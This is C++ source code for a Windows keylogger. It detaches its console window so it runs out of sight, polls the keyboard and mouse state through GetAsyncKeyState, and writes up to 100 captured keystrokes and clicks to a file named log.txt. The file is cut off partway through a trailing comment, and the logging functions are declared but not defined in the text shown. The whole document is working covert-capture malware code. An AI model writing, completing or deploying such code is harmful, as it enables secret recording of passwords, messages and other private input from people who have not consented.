#include <iostream>
#include <Windows.h>
#include <Winuser.h>
#include <fstream>

int log1(int, const char *);
int log2(int, const char *);
int log3(int, const char *);

// Maximum number of keys to record
const int max = 100;
// CAPSLOCK state
bool IsCapsLockUp;

int main() {
    // Detach program from its console
    FreeConsole();

    // Check CAPSLOCK state
    if((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        IsCapsLockUp = true;
    else
        IsCapsLockUp = false;

    int count = 0;
    while(count < max) {
        // Group #1 (SHIFT and CAPSLOCK keys have to be taken into consideration)

        // 65: <Aa>, 66: <Bb>, ..., 90: <Zz>
        for(int key = 65; key < 91; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log1(key, "log.txt");
            }
        }

        // Group #2 (Only the SHIFT key has to be taken into consideration)

        // 48: <0)>, 49: <1!>, ..., 57: <9(>
        for(int key = 48; key < 58; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log2(key, "log.txt");
            }
        }

        /*
         * 186: <;:>, 187: <=+>, 188: <,<>, 189: <-_>, 190: <.>>, 191: </?>,
         * 192: <`~>
         */
        for(int key = 186; key < 193; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log2(key, "log.txt");
            }
        }

        // 219: <[{>, 220: <\|>, 221: <]}>, 222: <'">
        for(int key = 219; key < 223; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log2(key, "log.txt");
            }
        }

        // Group #3 (SHIFT and CAPSLOCK keys needn't be taken into consideration)

        // 1: LMB
        if(GetAsyncKeyState(1) == -32767) {
            count++;
            log3(1, "log.txt");
        }

        // 2: RMB
        if(GetAsyncKeyState(2) == -32767) {
            count++;
            log3(2, "log.txt");
        }

        // 4: MMB
        if(GetAsyncKeyState(4) == -32767) {
            count++;
            log3(4, "log.txt");
        }

        // 8: BACK, 9: TAB
        for(int key = 8; key < 10; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log3(key, "log.txt");
            }
        }

        // 13: ENTER
        if(GetAsyncKeyState(13) == -32767) {
            count++;
            log3(13, "log.txt");
        }

        // 16: SHIFT
        if(GetAsyncKeyState(16) == -32767) {
            count++;
            log3(16, "log.txt");
        }

        // 20: CAPSLOCK
        if(GetAsyncKeyState(20) == -32767) {
            count++;
            log3(20, "log.txt");
        }

        // 27: ESC
        if(GetAsyncKeyState(27) == -32767) {
            count++;
            log3(27, "log.txt");
        }

        /*
         * 32: SPACE, 33: PGUP, 34: PGDN, 35: END, 36: HOME, 37: ARROWL, 38: ARROWU,
         * 39: ARROWR, 40: ARROWD
         */
        for(int key = 32; key < 41; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log3(key, "log.txt");
            }
        }

        // 45: INS, 46: DEL
        for(int key = 45; key < 47; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log3(key, "log.txt");
            }
        }

        // 91: LWIN, 92: RWIN, 93: MENU
        for(int key = 91; key < 94; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log3(key, "log.txt");
            }
        }

        // 112: F1, 113: F2, ..., 123: F12
        for(int key = 112; key < 124; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log3(key, "log.txt");
            }
        }

        // 162: LCTRL, 163: RCTRL, 164: LALT, 165: RALT
        for(int key = 162; key < 166; key++) {
            // If a key is pressed
            if(GetAsyncKeyState(key) == -32767) {
                count++;
                log3(key, "log.txt");
            }
        }
    }
    return 0;
}

/*
 * Encompassing the following characters (US standard keyboard):
 * a b c d e f g h i j k l m n o p q r s t u v w x y z
 * A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
 *
 * Notes:
 *  1. {Q, W, Y, A, Z, M} keys are not the same for every Latin keyboard layout.
 *  2. {A, B, ..., Z}-{Q, W, Y, A, Z,*/
